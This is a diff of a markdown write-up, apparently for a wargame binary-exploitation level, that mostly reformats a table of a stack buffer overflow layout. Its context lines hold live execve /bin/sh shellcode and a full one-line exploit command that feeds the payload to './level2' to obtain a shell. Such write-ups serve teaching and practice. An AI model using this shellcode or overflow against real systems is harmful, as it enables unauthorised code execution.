@@ -39,10 +39,46 @@ puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)            = 76
 b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
 ```
 
-|  Size  |      Name      | Data                                           |
-|:------:|:--------------:|------------------------------------------------|
-| <br>76 |    <br>Stack   | - '\90' * 20<br>- ShellCode (44)<br>- 'a' * 12 |
-|    4   |       SFP      | 'a' * 4                                        |
-|    4   | Return Address | Adress strdup                                  |
+```
+| Size |      Name      | Data           |
+|:----:|:--------------:|----------------|
+|      |                | '\90' * 20     |
+|  76  |      Stack     | ShellCode (44) |
+|      |                | 'a' * 12       |
+|------|----------------|----------------|
+|   4  |       SFP      | 'a' * 4        |
+|------|----------------|----------------|
+|   4  | Return Address | Adress strdup  |
+|------|----------------|----------------|
+```
+
+<table>
+<tbody>
+<tr>
+<td align="center">Size</td>
+<td align="center">Name</td>
+<td align="center">Data</td>
+</tr>
+<tr>
+<td align="center" rowspan="3">76</td>
+<td align="center" rowspan="3">Buffer</td>
+<td align="left">'\90' * 20</td>
+</tr>
+<tr><td align="left">ShellCode (44)</td></tr>
+<tr><td align="left">'a' * 12</td></tr>
+<tr>
+<td align="center">4</td>
+<td align="center">SFP</td>
+<td align="left">'a' * 4</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">Return Adress</td>
+<td>
+<p align="left">Adress strdup</p>
+</td>
+</tr>
+</tbody>
+</table>
 
 - `((python -c 'print("\x90"*20 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "A"*16 + "\x08\xa0\x04\x08")'); cat) | ./level2`
